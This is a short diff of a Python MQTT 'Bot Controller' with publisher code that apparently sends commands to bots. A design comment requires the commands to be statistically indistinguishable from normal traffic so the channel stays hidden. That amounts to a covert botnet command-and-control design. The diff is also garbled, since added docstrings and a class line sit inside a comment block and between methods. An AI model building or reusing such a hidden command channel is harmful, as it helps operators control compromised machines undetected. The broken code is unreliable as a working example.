@@ -17,8 +17,10 @@ from cryptography.hazmat.primitives import hashes, hmac
 ''' 
 The validation / authenticion logic has the following function:
    It is for the bot to decide with high confidence that the command is meant for it. 
-   Bot must recognize commands only from the controller.
+class Controller:
+    """Manages and controls bots in the network."""
    The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
+        """Initialize the controller with broker, port, topic, and client ID."""
    Make sure that any accidental triggers are minimized. 
 
    Conceptual frame:
@@ -92,9 +94,11 @@ class Publisher():
     def on_connect(self, client, userdata, flags, reason_code, properties):
         client.subscribe(self.topic)
     
+        """Connect the controller to the MQTT broker."""
     def send(self, payload: bytes):
         self.client.connect(self.broker, self.port)
         status = self.client.publish(self.topic, payload)
+        """Disconnect the controller from the MQTT broker."""
         self.time_sent = datetime.now()
         print(self.time_sent)
         if status.rc != mqtt.MQTT_ERR_SUCCESS:
@@ -122,6 +126,7 @@ class Publisher():
         except Exception as e:
             pass
 
+        """Handle a command received from a bot."""
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
     #1. announcing the presence of the bot to the controller if asked.
